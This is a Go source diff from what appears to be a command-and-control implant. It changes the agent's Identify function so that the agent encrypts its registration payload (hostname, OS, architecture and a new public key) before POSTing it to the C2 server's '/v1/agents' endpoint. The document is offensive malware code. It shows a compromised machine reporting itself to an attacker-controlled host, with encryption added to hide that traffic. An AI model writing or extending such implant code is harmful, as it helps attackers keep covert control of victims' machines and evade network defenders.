@@ -5,15 +5,18 @@ import (
 	"encoding/json"
 	"io"
 	"net/http"
+
+	cry "github.com/zarkones/xena-crypto"
 )
 
 // Identify should be called prior to interacting with the system.
 // It allows an agent to make itself known to the C2 server.
-func Identify(hostname, os, arch string) (id string, err error) {
+func Identify(hostname, os, arch, pubKeyPEM string) (id string, err error) {
 	payload := Agent{
-		Hostname: hostname,
-		OS:       os,
-		Arch:     arch,
+		Hostname:  hostname,
+		PubKeyPEM: pubKeyPEM,
+		OS:        os,
+		Arch:      arch,
 	}
 
 	jsonPayload, err := json.Marshal(&payload)
@@ -21,7 +24,12 @@ func Identify(hostname, os, arch string) (id string, err error) {
 		return "", err
 	}
 
-	req, err := http.NewRequest(http.MethodPost, *BaseURL+"/v1/agents", bytes.NewBuffer(jsonPayload))
+	encrypted, err := cry.SecureWrap(TrustedPubKey, string(jsonPayload))
+	if err != nil {
+		return "", err
+	}
+
+	req, err := http.NewRequest(http.MethodPost, *BaseURL+"/v1/agents", bytes.NewBuffer([]byte(encrypted)))
 	if err != nil {
 		return "", err
 	}
